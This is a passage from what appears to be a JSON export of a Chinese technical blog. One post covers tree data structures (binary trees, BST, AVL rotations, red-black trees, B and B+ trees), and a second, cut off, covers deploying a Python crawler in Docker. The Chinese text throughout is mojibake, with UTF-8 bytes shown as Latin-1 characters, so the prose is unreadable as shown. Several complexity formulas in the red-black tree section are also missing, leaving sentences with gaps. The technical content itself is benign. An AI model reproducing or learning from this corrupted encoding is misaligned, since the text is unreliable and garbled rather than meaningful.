‘ä¸­çš„ä»»ä¸€ç»“ç‚¹ç§°ä¸ºè¯¥ç»“ç‚¹çš„å­å­™ã€‚\n  + æ˜¾ç„¶ç¥–å…ˆå’Œå­å­™å…³ç³»æ˜¯çˆ¶å­å…³ç³»çš„å»¶ä¼¸ã€‚\n\n\n\n+ ç»“ç‚¹çš„å±‚æ•°ï¼ˆlevelï¼‰å’Œæ ‘çš„æ·±åº¦(depthï¼Œæˆ–ç§°é«˜åº¦heightï¼‰\n  + ç»“ç‚¹çš„å±‚æ¬¡ä»æ ¹ç»“ç‚¹å¼€å§‹ç®—èµ·ï¼Œæ ¹ç»“ç‚¹çš„å±‚æ•°ä¸º1ï¼Œå…¶ä½™ç»“ç‚¹çš„å±‚æ•°ç­‰äºå…¶åŒäº²ç»“ç‚¹çš„å±‚æ•°åŠ 1ã€‚æ¯”å¦‚ï¼Œå¦‚æœæŸä¸ªç»“ç‚¹çš„å±‚æ•°ä¸ºhï¼Œåˆ™å…¶å­æ ‘å°±åœ¨ç¬¬h+1å±‚ã€‚\n  + æ ‘ä¸­å„ä¸ªç»“ç‚¹å±‚æ•°çš„æœ€å¤§å€¼ç§°ä¸ºæ ‘çš„æ·±åº¦ï¼ˆé«˜åº¦ï¼‰ã€‚\n\n\n\n+ æœ‰åºæ ‘ï¼ˆordered treeï¼‰å’Œæ— åºæ ‘ï¼ˆunordered treeï¼‰\n\n  è‹¥ä¸€æ£µæ ‘ä¸­ç»“ç‚¹çš„å„å­æ ‘ä»å·¦åˆ°å³æ˜¯æœ‰æ¬¡åºçš„ï¼Œå³è‹¥äº¤æ¢äº†æŸç»“ç‚¹å„å­æ ‘çš„ç›¸å¯¹ä½ç½®å°±æ„æˆä¸åŒçš„æ ‘ï¼Œåˆ™ç§°è¿™æ£µæ ‘ä¸ºæœ‰åºæ ‘ï¼Œå¦åˆ™ç§°ä¸ºæ— åºæ ‘ã€‚\n\n\n\n+ è·¯å¾„ï¼ˆpathï¼‰\n\n  ä»æ ‘ä¸­çš„ä¸€ä¸ªç»“ç‚¹åˆ°å¦ä¸€ä¸ªç»“ç‚¹çš„è·¯é€”ï¼ˆè·¯å¾„åªèƒ½ç”±ä¸Šå‘ä¸‹ï¼Œä¸èƒ½æ¨ªå‘æˆ–ç”±ä¸‹å‘ä¸Šï¼‰\n\n\n\n+ æ£®æ—ï¼ˆforestï¼‰\n\n  mï¼ˆmâ‰¥0ï¼‰æ£µäº’ä¸ç›¸äº¤çš„æ ‘çš„é›†åˆ\n\n  \n\n\n\n# 2. äºŒå‰æ ‘\n\nä¸€èˆ¬çš„æ ‘è§„å¾‹æ€§å·®ï¼ŒäºŒå‰æ ‘ç»“æ„ç®€å•ï¼Œå­˜å‚¨å’Œå¤„ç†ç›¸å¯¹å®¹æ˜“ï¼Œè€Œä¸”ä¸€èˆ¬çš„æ ‘å¯ä»¥è½¬åŒ–ä¸ºäºŒå‰æ ‘å¤„ç†ã€‚\n\n### 2.1 äºŒå‰æ ‘çš„å®šä¹‰\n\n+ äºŒå‰æ ‘æ˜¯nï¼ˆnâ‰¥0ï¼‰ä¸ªç»“ç‚¹çš„æœ‰é™é›†åˆï¼Œé™¤äº†ç©ºæ ‘ï¼ˆn=0ï¼‰ä¹‹å¤–ï¼Œç”±ä¸€ä¸ªæ ¹ç»“ç‚¹åŠä¸¤æ£µä¸ç›¸äº¤çš„å·¦å­æ ‘å’Œå³å­æ ‘ç»„æˆï¼›\n\n+ äºŒå‰æ ‘æ¯ä¸ªç»“ç‚¹çš„åº¦æ•°â‰¤2ï¼›\n\n+ äºŒå‰æ ‘çš„å®šä¹‰æ˜¯é€’å½’çš„ã€‚\n\näºŒå‰æ ‘æœ‰äº”ç§åŸºæœ¬å½¢æ€ï¼š\n\n(1)ç©ºæ ‘\n\n(2)åªæœ‰æ ¹ç»“ç‚¹\n\n(3)åªæœ‰å·¦å­æ ‘\n\n(4)åªæœ‰å³å­æ ‘\n\n(5)å®Œæ•´äºŒå‰æ ‘\n\næ³¨æ„ï¼šäºŒå‰æ ‘çš„å­æ ‘ä¸€å®šè¦åˆ†å‡ºå·¦å³ï¼Œå¦åˆ™ä¸èƒ½ç§°ä½œäºŒå‰æ ‘ã€‚\n\n### 2.2 äºŒå‰æ ‘çš„æ€§è´¨\n\n+ äºŒå‰æ ‘çš„ç¬¬iå±‚çš„ç»“ç‚¹æ•°é‡æœ€å¤šä¸º 2<sup>i-1Â </sup> (i >= 1)\n\n  + 1å±‚ æœ€å¤š1\n\n  + 2å±‚ æœ€å¤š2\n\n  + 3å±‚ æœ€å¤š4\n\n    \n\n+ æ·±åº¦ä¸ºkçš„äºŒå‰æ ‘ç»“ç‚¹æ•°ç›®æœ€å¤šä¸º 2<sup>k</sup> -1 (k >= 1)\n\n  + æ·±1å±‚ æœ€å¤š1\n\n  + æ·±2å±‚ æœ€å¤š3\n\n  + æ·±3å±‚ æœ€å¤š7\n\n    \n\n+ åœ¨ä»»æ„äºŒå‰æ ‘ä¸­ï¼Œè‹¥å¶å­ç»“ç‚¹æ•°ä¸ºn0ï¼Œåº¦æ•°ä¸º2çš„ç»“ç‚¹æ•°ä¸ºn2ï¼Œåˆ™æœ‰n0=n2+1\n\n  æœ¬æ€§è´¨æ˜¯è¯´ï¼Œä»»æ„ä¸€é¢—äºŒå‰æ ‘ï¼Œå¶å­ç»“ç‚¹æ¯”åº¦æ•°ä¸º2çš„ç»“ç‚¹çš„ä¸ªæ•°å¤šä¸€ä¸ªã€‚\n\n  â€‹     1\n\n    1     1\n\n  11    11 \n\n  å¶å­èŠ‚ç‚¹4ä¸ª, åº¦æ•°ä¸º2çš„æ˜¯3ä¸ª\n\n\n\n\n### 2.3 äºŒå‰æ ‘å­˜å‚¨(å…ˆå˜æˆå®Œå…¨äºŒå‰æ ‘)\n\näºŒå‰æ ‘çš„å½¢çŠ¶å¯èƒ½ç¹å¤šä¸”ä¸å›ºå®šï¼Œä¸å¥½æŒæ¡è§„å¾‹ï¼Œè€Œè¿›è¡Œé¡ºåºå­˜å‚¨æ°æ°ç›¸åï¼Œè¦æ±‚è§„å¾‹æ€§å¼ºã€‚æ‰€ä»¥è¿™ç§å­˜å‚¨ä¸€å®šæ˜¯è§„å¾‹æ€§è¾ƒå¼ºçš„äºŒå‰æ ‘æ‰é€‚åˆã€‚å®Œå…¨äºŒå‰æ ‘ç¬¦åˆè¿™ä¸€ç‚¹ï¼Œè¿™ä¹Ÿæ˜¯å®ƒè¢«å®šä¹‰çš„åŸå› ä¹‹ä¸€ã€‚\n\nå¯¹äºå®Œå…¨äºŒå‰æ ‘è¿›è¡Œç»“ç‚¹ç¼–å·ï¼ˆè‡ªä¸Šè€Œä¸‹ï¼Œè‡ªå·¦è‡³å³ï¼‰åï¼Œç¼–å·å¯ä»¥åæ˜ ç»“ç‚¹çš„åˆ†æ”¯å’Œä»å±å…³ç³»ï¼Œå°†è¿™äº›ç»“ç‚¹å­˜å…¥ä¸€ç»´æ•°ç»„æ—¶ï¼Œç¼–å·å’Œæ•°ç»„ä¸‹æ ‡å¯ä»¥å¯¹åº”èµ·æ¥ã€‚\n\nå¯¹äºä¸€èˆ¬çš„äºŒå‰æ ‘ï¼Œä¸æ˜“ç›´æ¥é‡‡ç”¨é¡ºåºå­˜å‚¨ï¼Œå¯ä»¥è™šè¡¥æˆå®Œå…¨äºŒå‰æ ‘åå†ç”¨é¡ºåºå­˜å‚¨çš„æ–¹æ³•å­˜å‚¨ã€‚\n\n\n\nç„¶åæ•°ç»„çš„æ¯ä¸ªèŠ‚ç‚¹ç»“æ„å¯ä»¥å¦‚ä¸‹:\n\n```c\ntypedef struct node\n{\n DataType data;\n struct node *lchild,*parents,*rchild;\n}ThTree;\n```\n\n\n\n### 2.4 äºŒå‰æ ‘éå†\n\n+ å…ˆåºéå†ï¼š**æ ¹**ï¼Œå·¦å­æ ‘ï¼Œå³å­æ ‘   \n\n+ ä¸­åºéå†ï¼šå·¦å­æ ‘ï¼Œ**æ ¹**ï¼Œå³å­æ ‘  \n\n+ ååºéå†ï¼šå·¦å­æ ‘ï¼Œå³å­æ ‘ï¼Œ**æ ¹**\n\n  \n\nä¸­åºæ›´é‡è¦, åªæœ‰ä¸­åºå’Œå…¶ä»–ä¸€ä¸ªåºç»„åˆ,å°±èƒ½è¿˜åŸäºŒå‰æ ‘\n\n\n\n# 3. äºŒå‰æ ‘çš„ç§ç±»\n\n### 3.1 æ»¡äºŒå‰æ ‘(å°±æ˜¯èŠ‚ç‚¹å…¨æ»¡äº†)\n\næ»¡äºŒå‰æ ‘çš„å®šä¹‰ï¼šæ·±åº¦ä¸ºkï¼ˆkâ‰¥1ï¼‰ä¸”ç»“ç‚¹æ•°ä¸º 2<sup>k</sup> -1çš„äºŒå‰æ ‘ã€‚\n\næ»¡äºŒå‰æ ‘çš„ç»“ç‚¹æ•°è¾¾åˆ°æœ€å¤§å€¼ã€‚\n\n\n\n### 3.2 å®Œå…¨äºŒå‰æ ‘(é™¤æœ€åä¸€å±‚éƒ½æ˜¯æ»¡çš„,å› ä¸ºæ•°é‡ä¸å¯èƒ½æ­£å¥½æ»¡äºŒå‰æ ‘,å¸¸ç”¨)\n\nå¯¹äºæ»¡äºŒå‰æ ‘çš„ç»“ç‚¹ï¼ŒæŒ‰ä¸‹åˆ—è§„åˆ™ç¼–å·ï¼š\n(1)ä»æ ¹ç»“ç‚¹å¼€å§‹ï¼Œè‡ªä¸Šè€Œä¸‹ï¼›\n(2)åŒä¸€å±‚è‡ªå·¦è‡³å³ã€‚\n\n+ æ»¡äºŒå‰æ ‘çš„ç»“ç‚¹ç¼–å·åï¼Œä»»æ„å–æ»¡äºŒå‰æ ‘çš„å‰è‹¥å¹²ä¸ªè¿ç»­çš„ç»“ç‚¹æ‰€å¯¹åº”çš„äºŒå‰æ ‘ï¼Œç§°ä¸ºå®Œå…¨äºŒå‰æ ‘ã€‚\n\n+ å®Œå…¨äºŒå‰æ ‘çš„ç‰¹ç‚¹ï¼šé™¤æœ€åä¸€å±‚å¤–ï¼Œå…¶ä½™å„å±‚å‡æ˜¯æ»¡çš„ï¼Œæœ€åä¸€å±‚ï¼Œç»“ç‚¹è¿ç»­å‡ºç°åœ¨å·¦è¾¹ã€‚\n\nè¯·æ³¨æ„ï¼šæ»¡äºŒå‰æ ‘è¦æ±‚å¤ªç‰¹æ®Šä¸”ä¸¥æ ¼ï¼Œä¸€èˆ¬ä¸å®¹æ˜“æ»¡è¶³ï¼Œè€Œå®Œå…¨äºŒå‰æ ‘æ¡ä»¶ä½ä¸€äº›ï¼Œå®¹æ˜“æ»¡è¶³ï¼Œä»Šåä¼šç»å¸¸ç”¨åˆ°å®ƒï¼Œæ‰€ä»¥è¦æ³¨æ„å®ƒã€‚\n\n\n\n### 3.3 äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆè‹±è¯­ï¼šBinary Search Treeï¼Œç®€å†™ä¸ºBSTï¼‰\n\nä¹Ÿç§° **äºŒå‰æœç´¢æ ‘**ã€**æœ‰åºäºŒå‰æ ‘**ï¼ˆè‹±è¯­ï¼šordered binary treeï¼‰ï¼Œ**æ’åºäºŒå‰æ ‘**ï¼ˆè‹±è¯­ï¼šsorted binary treeï¼‰ä¸ä¸€å®šæ˜¯å®Œå…¨äºŒå‰æ ‘\n\næ˜¯æŒ‡ä¸€æ£µç©ºæ ‘æˆ–è€…å…·æœ‰ä¸‹åˆ—æ€§è´¨çš„äºŒå‰æ ‘ï¼š\n\n+ è‹¥ä»»æ„èŠ‚ç‚¹çš„å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼›\n\n+ è‹¥ä»»æ„èŠ‚ç‚¹çš„å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼›\n\n+ ä»»æ„èŠ‚ç‚¹çš„å·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æŸ¥æ‰¾æ ‘ï¼›\n\n+ æ²¡æœ‰é”®å€¼ç›¸ç­‰çš„èŠ‚ç‚¹ã€‚\n\nç®€å•çš„è¯´å°±æ˜¯ï¼šå„èŠ‚ç‚¹å€¼ä¸åŒï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå­æ ‘ï¼šå·¦<æ ¹<å³ã€‚\n\n\n\n##### 3.3.1 ç®—æ³•å¤æ‚åº¦\n\n+ ç®—æ³•æŸ¥æ‰¾æ—¶é—´ä¾èµ–äºæ ‘çš„æ‹“æ‰‘ç»“æ„ã€‚æœ€ä½³æƒ…å†µæ˜¯ O(logÂ­2n)ï¼Œè€Œæœ€åæƒ…å†µæ˜¯ O(n)ã€‚\n\n+ æ’å…¥ç®—æ³•çš„å¤æ‚åº¦ä¸æŸ¥æ‰¾ç®—æ³•çš„å¤æ‚åº¦æ˜¯ä¸€æ ·çš„ï¼šæœ€ä½³æƒ…å†µæ˜¯ O(logÂ­2n)ï¼Œè€Œæœ€åæƒ…å†µæ˜¯ O(n)ã€‚\n\n  å¦‚ä½•æ’å…¥å€¼ç›¸ç­‰ç›´æ¥ä¸¢å¼ƒæˆ–æŠ›å‡ºå¼‚å¸¸\n\n+ åˆ é™¤ç®—æ³•çš„è¿è¡Œæ—¶é—´ä¹Ÿä¸ BST çš„æ‹“æ‰‘ç»“æ„æœ‰å…³ï¼Œæœ€ä½³æƒ…å†µæ˜¯ O(logÂ­2n)ï¼Œè€Œæœ€åæƒ…å†µæ˜¯ O(n)ã€‚\n\n  åˆ é™¤ä¸€ä¸ªéå¶å­èŠ‚ç‚¹ï¼Œå°±å¿…é¡»é€‰æ‹©å…¶ä»–èŠ‚ç‚¹æ¥å¡«è¡¥å› åˆ é™¤èŠ‚ç‚¹æ‰€é€ æˆçš„æ ‘çš„æ–­è£‚ã€‚\n\n\n\n### 3.4 å¹³è¡¡äºŒå‰æ ‘\n\nå¹³è¡¡äºŒå‰æ ‘çš„æå‡ºå°±æ˜¯ä¸ºäº†ä¿è¯æ ‘ä¸è‡³äºå¤ªå€¾æ–œï¼Œå°½é‡ä¿è¯ä¸¤è¾¹å¹³è¡¡ã€‚å› æ­¤å®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š\n\n1. å¹³è¡¡äºŒå‰æ ‘è¦ä¹ˆæ˜¯ä¸€æ£µç©ºæ ‘\n2. è¦ä¹ˆä¿è¯å·¦å³å­æ ‘çš„é«˜åº¦ä¹‹å·®ä¸å¤§äº 1\n3. å­æ ‘ä¹Ÿå¿…é¡»æ˜¯ä¸€é¢—å¹³è¡¡äºŒå‰æ ‘\n\nè¿™ç§å½¢æ€å°±æ˜¯å¹³è¡¡ï¼Œä¼šä½¿æŸ¥æ‰¾é€Ÿåº¦æ›´å¿«ã€‚ä¸ºä»€ä¹ˆèƒ½å¤Ÿä¿æŒè¿™ç§å¥½èº«æå‘¢ï¼Ÿé€šè¿‡åœ¨æ–°å¢/åˆ é™¤æ—¶çš„æ—‹è½¬ï¼ˆ`å·¦æ—‹å’Œå³æ—‹`ï¼‰ã€‚\n\n\n\n##### 3.4.1 å¹³è¡¡è°ƒæ•´\n\n1. æ‰¾å¹³è¡¡å› å­ = 2\n\n2. æ‰¾æ’å…¥æ–°èŠ‚ç‚¹åå¤±å»å¹³è¡¡çš„æœ€å°å­æ ‘\n\n   + è·ç¦»æ’å…¥ç‚¹æœ€è¿‘\n   + å¹³è¡¡å› å­ç»å¯¹å€¼å¤§äº1çš„ç»“ç‚¹ä½œä¸ºæ ¹\n   + ç¡®è®¤è°ƒæ•´çš„ç‚¹:     å…ˆç¡®å®šæ ¹ -> å¯¹æ’å…¥çš„æ–°èŠ‚ç‚¹, è·¯ä¸Šçš„3ä¸ªç‚¹\n\n3. å¹³è¡¡è°ƒæ•´, æœ‰å››ç§ç±»å‹\n\n   + LL-> R \t\n\n     ä¸­ä¸ºæ”¯ç‚¹, é«˜å³æ—‹\n\n   + RR -> L\n\n     ä¸­ä¸ºæ”¯ç‚¹, é«˜å·¦æ—‹\n   \n   + LR -> LR\n   \n     ä¸‹äºŒæ•´ä½“å…ˆå·¦è½¬, å˜æˆ LL å†å³è½¬\n   \n   + RL -> RL\n   \n     ä¸‹äºŒæ•´ä½“å…ˆå³è½¬, å˜æˆ RR å†å·¦è½¬\n\n\n\n##### 3.4.2 å¸¸è§çš„å¹³è¡¡æ ‘ï¼š\n\n[AVLæ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AVLæ ‘)ã€[Treap](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/Treap)ã€[ä¼¸å±•æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/ä¼¸å±•æ ‘)ã€[çº¢é»‘æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/çº¢é»‘æ ‘)ã€[åŠ æƒå¹³è¡¡æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/åŠ æƒå¹³è¡¡æ ‘)ã€[2-3æ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/2-3æ ‘)ã€[AAæ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/AAæ ‘)ã€[æ›¿ç½ªç¾Šæ ‘](https://link.jianshu.com/?t=https://zh.wikipedia.org/wiki/æ›¿ç½ªç¾Šæ ‘)ã€èŠ‚ç‚¹å¤§å°å¹³è¡¡æ ‘\n\n\n\n### 3.5 çº¢é»‘æ ‘ï¼ˆRedâ€“black tree)\n\nçº¢é»‘æ ‘æ˜¯ä¸€ç§å«æœ‰çº¢é»‘ç»“ç‚¹å¹¶èƒ½è‡ªå¹³è¡¡çš„äºŒå‰æŸ¥æ‰¾æ ‘ã€‚å®ƒå¿…é¡»æ»¡è¶³ä¸‹é¢æ€§è´¨ï¼š\n\n+ æ€§è´¨1ï¼šæ¯ä¸ªèŠ‚ç‚¹è¦ä¹ˆæ˜¯é»‘è‰²ï¼Œè¦ä¹ˆæ˜¯çº¢è‰²ã€‚\n+ æ€§è´¨2ï¼šæ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²ã€‚æ¯ä¸ªå¶å­èŠ‚ç‚¹ï¼ˆNILï¼‰æ˜¯é»‘è‰²ã€‚\n+ æ€§è´¨3ï¼šæ ‘ä¸­ä¸å­˜åœ¨ä¸¤ä¸ªç›¸é‚»çš„çº¢è‰²ç»“ç‚¹ï¼ˆå³çº¢è‰²ç»“ç‚¹çš„çˆ¶ç»“ç‚¹å’Œå­©å­ç»“ç‚¹å‡ä¸èƒ½æ˜¯çº¢è‰²ï¼‰\n+ æ€§è´¨4ï¼šä»ä»»æ„ä¸€ä¸ªç»“ç‚¹ï¼ˆåŒ…æ‹¬æ ¹ç»“ç‚¹ï¼‰åˆ°å…¶ä»»ä½•åä»£ NULL ç»“ç‚¹ï¼ˆé»˜è®¤æ˜¯é»‘è‰²çš„ï¼‰çš„æ¯æ¡è·¯å¾„éƒ½å…·æœ‰ç›¸åŒæ•°é‡çš„é»‘è‰²ç»“ç‚¹ã€‚\n\n\n\n![1](æ ‘çš„ä»‹ç»å’Œåˆ†ç±»/1.png)\n\n\n\n##### ä¸ºä»€ä¹ˆè¦æœ‰çº¢é»‘æ ‘ï¼Ÿ\n\nå¤§å¤šæ•°äºŒå‰æ’åºæ ‘BSTçš„æ“ä½œï¼ˆæŸ¥æ‰¾ã€æœ€å¤§å€¼ã€æœ€å°å€¼ã€æ’å…¥ã€åˆ é™¤ç­‰ç­‰ï¼‰éƒ½æ˜¯ çš„æ—¶é—´å¤æ‚åº¦ï¼Œh ä¸ºæ ‘çš„é«˜åº¦ã€‚ä½†æ˜¯å¯¹äºæ–œæ ‘è€Œè¨€ï¼ˆBSTæç«¯æƒ…å†µä¸‹å‡ºç°ï¼‰ï¼ŒBSTçš„è¿™äº›æ“ä½œçš„æ—¶é—´å¤æ‚åº¦å°†è¾¾åˆ° ã€‚ä¸ºäº†ä¿è¯BSTçš„æ‰€æœ‰æ“ä½œçš„æ—¶é—´å¤æ‚åº¦çš„ä¸Šé™ä¸º ï¼Œå°±è¦æƒ³åŠæ³•æŠŠä¸€é¢—BSTæ ‘çš„é«˜åº¦ä¸€ç›´ç»´æŒåœ¨ ï¼Œè€Œçº¢é»‘æ ‘å°±åšåˆ°äº†è¿™ä¸€ç‚¹ï¼Œçº¢é»‘æ ‘çš„é«˜åº¦å§‹ç»ˆéƒ½ç»´æŒåœ¨ ï¼Œn ä¸ºæ ‘ä¸­çš„é¡¶ç‚¹æ•°ç›®.\n\n##### çº¢é»‘æ ‘RBTä¸å¹³è¡¡äºŒå‰æ ‘AVLæ¯”è¾ƒï¼š\n\nAVL æ ‘æ¯”çº¢é»‘æ ‘æ›´åŠ å¹³è¡¡ï¼Œä½†AVLæ ‘åœ¨æ’å…¥å’Œåˆ é™¤çš„æ—¶å€™ä¹Ÿä¼šå­˜åœ¨å¤§é‡çš„æ—‹è½¬æ“ä½œã€‚æ‰€ä»¥å½“ä½ çš„åº”ç”¨æ¶‰åŠåˆ°é¢‘ç¹çš„æ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œåˆ‡è®°æ”¾å¼ƒAVLæ ‘ï¼Œé€‰æ‹©æ€§èƒ½æ›´å¥½çš„çº¢é»‘æ ‘ï¼›å½“ç„¶ï¼Œå¦‚æœä½ çš„åº”ç”¨ä¸­æ¶‰åŠçš„æ’å…¥å’Œåˆ é™¤æ“ä½œå¹¶ä¸é¢‘ç¹ï¼Œè€Œæ˜¯æŸ¥æ‰¾æ“ä½œç›¸å¯¹æ›´é¢‘ç¹ï¼Œé‚£ä¹ˆå°±ä¼˜å…ˆé€‰æ‹© AVL æ ‘è¿›è¡Œå®ç°ã€‚\n\n\n\n# 4. å…¶ä»–ç§ç±»çš„æ ‘\n\n### 4.1 å“ˆå¤«æ›¼æ ‘(éœå¤«æ›¼æ ‘)\n\nå¸¦æƒçš„æ ‘,  åŠ èµ·æ¥ WPL æœ€å°, å¯ç”¨æ¥å‹ç¼©\n\n\n\n### 4.2 Bæ ‘(B-æ ‘)\n\nNå‰çš„æ’åºæ ‘\n\n+ ç»“ç‚¹æœ€å¤šå«æœ‰m é¢—å­æ ‘ï¼Œm-1ä¸ªå…³é”®å­—ï¼ˆæ•°æ®ï¼‰ï¼ˆm>=2ï¼‰\n+ è‹¥æ ¹èŠ‚ç‚¹ä¸æ˜¯å¶å­èŠ‚ç‚¹ï¼Œåˆ™è‡³å°‘æœ‰ä¸¤é¢—å­æ ‘ã€‚\n\nä¸æ»¡è¶³ï¼Œå°±åˆ†è£‚ï¼Œä»ä¸­é—´åˆ†å¼€ï¼Œåˆ†æˆä¸¤é¢—å­æ ‘\n\n+ é™¤æ ¹èŠ‚ç‚¹å’Œå¶å­èŠ‚ç‚¹å¤–ï¼Œå…¶ä»–æ¯ä¸ªèŠ‚ç‚¹è‡³å°‘æœ‰ceil(m/2)ä¸ªå­èŠ‚ç‚¹ï¼ˆå­æ ‘ï¼‰ã€‚2.1=>3, 2.7=>3\n\n\n\n### 4.3 B+æ ‘ \n\n##### 4.3.1 æ•°æ®åº“ä¸ºä»€ä¹ˆä¸ç”¨çº¢é»‘æ ‘\n\n+ æ ‘å¤ªé«˜ï¼Œè¯»å–æ¬¡æ•°è¿‡å¤š\n+ è¯»å–æµªè´¹å¤ªå¤šï¼Œä¸è¿ç»­\n\n##### 4.3.2 å’Œ B æ ‘çš„åŒºåˆ«\n\n+ å¶å­èŠ‚ç‚¹è¿èµ·æ¥äº† åŒå‘é“¾è¡¨ï¼ˆæ–¹ä¾¿èŒƒå›´æŸ¥æ‰¾ï¼‰\n\n+ éå¶å­èŠ‚ç‚¹ä¸å­˜æ•°æ®ï¼Œæ•°æ®éƒ½å­˜åœ¨å¶å­èŠ‚ç‚¹\n\n  \n\n# 5. å¤´è„‘é£æš´\n\n### 5.1 å·¦æ—‹å³æ—‹\n\n+ å·¦æ—‹\n\n  çˆ¶äº²æ‰ä¸‹å»ï¼Œå³å„¿å­ä¸Šå»ï¼Œä¸ºäº†ä¸Šå»ï¼Œå„¿å­å‰²å·¦è…¿è¡¥å¿ç»™çˆ¶äº²å³è…¿\n\n+ å³æ—‹\n\n  çˆ¶äº²æ‰ä¸‹å»ï¼Œå·¦å„¿å­ä¸Šå»ï¼Œä¸ºäº†ä¸Šå»ï¼Œå„¿å­å‰²å³è…¿è¡¥å¿ç»™çˆ¶äº²å·¦è…¿\n\n  \n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.jianshu.com/p/a826ab614e4a\n\n+ [äºŒå‰æŸ¥æ‰¾æ ‘](https://www.cnblogs.com/gaochundong/p/binary_search_tree.html)\n\n+ [ä¸ºä»€ä¹ˆmysqlç´¢å¼•è¦ä½¿ç”¨B+æ ‘ï¼Œè€Œä¸æ˜¯Bæ ‘ï¼Œçº¢é»‘æ ‘](https://segmentfault.com/a/1190000021488885)\n\n  \n\n","tags":["ç®—æ³•"],"categories":["æ•°æ®ç»“æ„"]},{"title":"pythonçˆ¬è™«é¡¹ç›®åœ¨dockerä¸­çš„éƒ¨ç½²å®è·µ","url":"%2Fp%2Fdc81a411.html","content":"\n\n\n### 1. é€‰æ‹©é•œåƒ\n\nè¿™é‡Œé€‰æ‹©åŸºç¡€é•œåƒæ—¶æ˜¯æœ‰è®²ç©¶. ä¸€æ˜¯åº”å½“å°½é‡é€‰æ‹©å®˜æ–¹é•œåƒåº“é‡Œçš„åŸºç¡€é•œåƒï¼›äºŒæ˜¯åº”å½“é€‰æ‹©è½»é‡çº§çš„é•œåƒåšåº•åŒ….\n\nå°±å…¸å‹çš„ Linux åŸºç¡€é•œåƒæ¥è¯´ï¼Œå¤§å°å…³ç³»å¦‚ä¸‹ï¼šUbuntu > CentOS > Debian> Alpine\n\nAlpine Docker é•œåƒä¹Ÿç»§æ‰¿äº† Alpine Linux å‘è¡Œç‰ˆçš„è¿™äº›ä¼˜åŠ¿ã€‚ç›¸æ¯”äºå…¶ä»– Docker é•œåƒï¼Œå®ƒçš„å®¹é‡éå¸¸å°ï¼Œä»…ä»…åªæœ‰ 5 MB å·¦å³ï¼ˆå¯¹æ¯” Ubuntu ç³»åˆ—é•œåƒæ¥è¿‘ 200 MBï¼‰ï¼Œä¸”æ‹¥æœ‰éå¸¸å‹å¥½çš„åŒ…ç®¡ç†æœºåˆ¶apkã€‚\n\n<!-- more -->\n\n### 2. æ‹·è´æ–‡ä»¶\n\nç›¸å¯¹äº ADD,ä¼˜å…ˆä½¿ç”¨ COPYæŒ‡ä»¤\n\nå¦å¤–å‘ç°æ‹·è´æ–‡ä»¶å¤¹æ˜¯æŠŠæ–‡ä»¶å¤¹çš„å†…å®¹æ‹·è´è¿›å», è€Œä¸æ˜¯æŠŠæ•´ä¸ªç›®å½•æ‹·è´è¿›å», å‘çˆ¹ æœ€åä½¿ç”¨dockerignoreè§£å†³è¿™ä¸ªé—®é¢˜.\n\n```dockerfile\ncopy . /zk8/\n```\n\n.dockerignoreæ–‡ä»¶\n\n```\nchromedriver\n*.sh\n.*\n**/__pycache__/\nDockerfile\n```\n\n\n\n### 3. æµ‹è¯• dockerfile\n\n##### 3.1 é•œåƒåŠ é€Ÿ\n\nåœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™, å‘ç°è¿Alpineéƒ½æ‹‰å–ä¸ä¸‹æ¥, æ­¤å¤„æ„Ÿè°¢ä¼Ÿå¤§çš„ great wall. äºæ˜¯é€‰æ‹©é˜¿é‡Œäº‘åŠ é€Ÿ.\n\nhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors\n\nå³é”®ç‚¹å‡»æ¡Œé¢é¡¶æ çš„ docker å›¾æ ‡ï¼Œé€‰æ‹© Preferences ï¼Œåœ¨ Daemon æ ‡ç­¾ï¼ˆDocker 17.03 ä¹‹å‰ç‰ˆæœ¬ä¸º Advanced æ ‡ç­¾ï¼‰ä¸‹çš„ Registry mirrors åˆ—è¡¨ä¸­\n\nå°† https://xxxxxxxxx.mirror.aliyuncs.com åŠ åˆ° \"registry-mirrors\" çš„æ•°ç»„é‡Œï¼Œç‚¹å‡»Apply & Restart æŒ‰é’®ï¼Œç­‰å¾… Docker é‡å¯å¹¶åº”ç”¨é…ç½®çš„é•œåƒåŠ é€Ÿå™¨ã€‚\n\nps: å°±æ˜¯é˜¿é‡Œäº‘åŠ é€Ÿ, åœ¨åç»­çš„å®‰è£…è½¯ä»¶ä¸­ä¹Ÿæ˜¯ç‰¹åˆ«æ…¢, æ­¤å¤„å»ºè®®åœ¨äº‘æœåŠ¡å™¨ä¸Š(å…è´¹çš„è°·æ­Œäº‘)æ“ä½œ.\n\n##### 3.2 æµ‹è¯•\n\n```bash\ndocker build -t zk8:0.1 .   #  åˆ¶ä½œ image\ndocker run -ti --rm zk8:0.1 /bin/sh   # å¯åŠ¨å®¹å™¨ç»“æŸååˆ é™¤, ç”¨è¿™ç§æ–¹æ³•å¯ä»¥éå¸¸æ–¹ä¾¿æµ‹è¯•\n```\n\nå‰æœŸå¯ä»¥é€šè¿‡ shell è¿›å…¥åˆ°å®¹å™¨é‡Œé¢æµ‹è¯•, åœ¨é‡Œé¢å°è¯•å®‰è£…ç›¸åº”çš„è½¯ä»¶åŒ…, ç„¶åå†å†™ dockerfileä¼šæ¯”è¾ƒæ–¹ä¾¿\n\n\n\n### 4. 